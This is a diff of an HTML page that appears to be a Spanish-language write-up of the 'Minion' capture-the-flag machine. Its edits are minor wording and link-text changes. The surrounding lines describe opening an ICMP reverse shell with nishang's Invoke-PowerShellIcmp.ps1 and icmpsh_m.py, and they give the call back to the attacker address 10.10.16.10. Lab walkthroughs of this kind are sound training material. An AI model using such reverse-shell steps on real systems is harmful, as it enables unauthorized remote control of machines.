@@ -163,7 +163,7 @@
 
 <p>Maquina muy guapa asi que vamos a darle!.</p>
 
-<p>Comenzamos como de costumbre creando un directorio con el nombre de la maquina:</p>
+<p>Comenzamos como es de costumbre creando un directorio con el nombre de la maquina:</p>
 
 <pre><code class="language-bash">❯ mkdir Minion
 ❯ ls
@@ -352,7 +352,7 @@ tcpdump: listening on tun0, link-type RAW (Raw IP), snapshot length 262144 bytes
 <p>Pero podriamos entablarnos una <code>reverse shell</code> por <code>ICMP</code> ya que tenemos traza con nuestra maquina, para ello vamos a usar el script <code>Invoke-PowerShellIcmp.ps1</code> del repositorio de <code>nishang</code>:</p>
 
 <ul>
-  <li><a href="https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellIcmp.ps1">https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellIcmp.ps1</a></li>
+  <li><a href="https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellIcmp.ps1">Invoke-PowerShellIcmp.ps1</a></li>
 </ul>
 
 <p>Cateamos el script y vemos que necesitamos ejecutar dos comandos y uno de ellos ejecuta el script <code>icmpsh_m.py</code> que necesitamos descargar.</p>
@@ -362,7 +362,7 @@ tcpdump: listening on tun0, link-type RAW (Raw IP), snapshot length 262144 bytes
 <p>Nos descargamos el archivo y ejecutamos los comandos.</p>
 
 <ul>
-  <li><a href="https://github.com/bdamele/icmpsh/blob/master/icmpsh_m.py">https://github.com/bdamele/icmpsh/blob/master/icmpsh_m.py</a></li>
+  <li><a href="https://github.com/bdamele/icmpsh/blob/master/icmpsh_m.py">icmpsh_m.py</a></li>
 </ul>
 
 <p>Ahora para evitar problemas en el script <code>Invoke-PowerShellIcmp.ps1</code> vamos a quitar todos los comentarios, tambien las lineas vacias y agregar al final <code>Invoke-PowerShellIcmp -IPAddress 10.10.16.10</code>, para que al interpretarse ejecute la instrucción.</p>
